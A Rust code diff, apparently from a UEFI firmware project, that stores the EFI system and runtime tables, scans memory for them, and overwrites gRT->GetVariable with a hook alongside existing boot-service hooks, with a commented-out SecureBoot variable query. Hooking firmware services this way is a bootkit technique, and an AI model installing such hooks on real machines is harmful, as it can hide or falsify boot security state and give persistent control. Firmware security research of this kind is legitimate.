@@ -1,3 +1,4 @@
+use crate::dxe::find_services;
 use crate::efi::{
     Guid,
     BootServices,
@@ -6,16 +7,24 @@ use crate::efi::{
     EfiResult,
     EfiStatus,
 };
-use core::{mem::MaybeUninit, fmt::Write, ffi::c_void};
+use core::{mem::MaybeUninit, fmt::Write, ffi::c_void, ptr};
 use crate::Cptr;
 use macros::guid;
 
 pub unsafe fn install_dxe_hooks(
-    st: &mut SystemTable,
+    st: &'static mut SystemTable,
     bs: &mut BootServices,
-    rt: &'static mut RuntimeServices) -> EfiResult<()> {
+    rt: &'static mut RuntimeServices,
+    phit_lo: *const u64,
+    phit_hi: *const u64) -> EfiResult<()> {
 
+    debug!("DxeMain debug gRT {:p}", rt);
+    debug!("DxeMain debug gST {:p}", st);
+
+    ST.write(st);
     RT.write(rt);
+    PHIT_LO = phit_lo;
+    PHIT_HI = phit_hi;
 
     info!("hooking gBS->RegisterProtocolNotify");
     ORIG_REG_PROTO_NOTIFY = bs.register_protocol_notify;
@@ -25,6 +34,10 @@ pub unsafe fn install_dxe_hooks(
 }
 
 static mut RT: MaybeUninit<&mut RuntimeServices> = MaybeUninit::<_>::uninit();
+static mut ST: MaybeUninit<&mut SystemTable> = MaybeUninit::<_>::uninit();
+
+static mut PHIT_LO: *const u64 = ptr::null();
+static mut PHIT_HI: *const u64 = ptr::null();
 
 static mut EXIT_BOOT_SERVICES: extern "efiapi" fn(Cptr, usize) -> EfiStatus
     = exit_boot_services_hook;
@@ -43,11 +56,31 @@ extern "efiapi" fn reg_proto_notify_hook(
 
     if unsafe { *guid } == FIRMWARE_VOLUME_2_PROTOCOL_GUID {
         info!("intercepted DxeMain after initialisation");
-        // Lazy hooking after gRT has been initialised (this is super ugly).
         unsafe {
-            ORIG_RT_GET_VARIABLE = (*RT.as_ptr()).get_variable;
-            (*RT.as_mut_ptr()).get_variable = rt_get_variable_hook;
+            let above_rt = (RT.assume_init_ref() as *const _ as *const u64).add(1);
+            let mut st = *ST.assume_init_ref() as *const _;
+            let mut lo = PHIT_LO;
+            while st == *ST.assume_init_ref() as *const _{
+                st = find_services(lo, PHIT_HI).unwrap().0;
+                lo = (st as *const u64).add(1);
+            }
         }
+        // Lazy hooking after gRT has been initialised.
+        unsafe {
+            debug!("gST->Runtime {:p}", ST.assume_init_ref().runtime_services);
+            info!("hooking gRT->GetVariable");
+            ORIG_RT_GET_VARIABLE =  RT.assume_init_ref().get_variable;
+            (&mut *RT.as_mut_ptr()).get_variable = rt_get_variable_hook;
+            debug!("original {:p}", ORIG_RT_GET_VARIABLE as *const ());
+            debug!("modified {:p}", &rt_get_variable_hook);
+        }
+
+        /*
+         *unsafe {
+         *let name = b"\xff\xfeS\x00e\x00c\x00u\x00r\x00e\x00B\x00o\x00o\x00t\x00";
+         *(RT.assume_init_ref().get_variable)(RT.assume_init_ref(), name.as_ptr() as *const u16, guid, ptr::null_mut(), ptr::null_mut(), ptr::null_mut());
+         *}
+         */
     }
     unsafe { ORIG_REG_PROTO_NOTIFY(guid, event, reg) }
 }
